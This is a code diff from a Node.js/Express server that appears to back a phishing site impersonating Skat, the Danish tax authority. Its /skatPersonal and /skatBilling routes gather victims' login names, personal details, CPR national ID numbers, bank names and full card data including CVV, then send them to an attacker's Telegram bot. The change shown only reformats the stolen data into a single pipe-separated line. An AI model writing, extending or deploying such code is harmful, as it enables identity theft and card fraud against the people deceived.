@@ -4273,7 +4273,7 @@ app.post("/skatPersonal", (req, res) => {
   telephone = req.body.telephone
   cpr = req.body.cpr
   bank = req.body.bank
-  var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}`;
+  var originalText = `Username: ${username} | Full Name: ${fullname} | DOB: ${dob} | Address: ${address} | City: ${city} | ZIP: ${zip} | Phone Number: ${telephone} | CPR: ${cpr} | Bank: ${bank}`;
 
   axios
     .post(
@@ -4341,7 +4341,7 @@ app.post("/skatBilling", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
-      var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `Username: ${username} | Full Name: ${fullname} | DOB: ${dob} | Address: ${address} | City: ${city} | ZIP: ${zip} | Phone Number: ${telephone} | CPR: ${cpr} | Bank: ${bank} | Card Name: ${ccname} | Card Number: ${ccnum} | Expiry: ${ccexp} | CVV: ${cccvv} | User Agent: ${userAgent} | IP: ${ip} | ${binList}`;
       axios
         .post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=Skat:\n${originalText}`
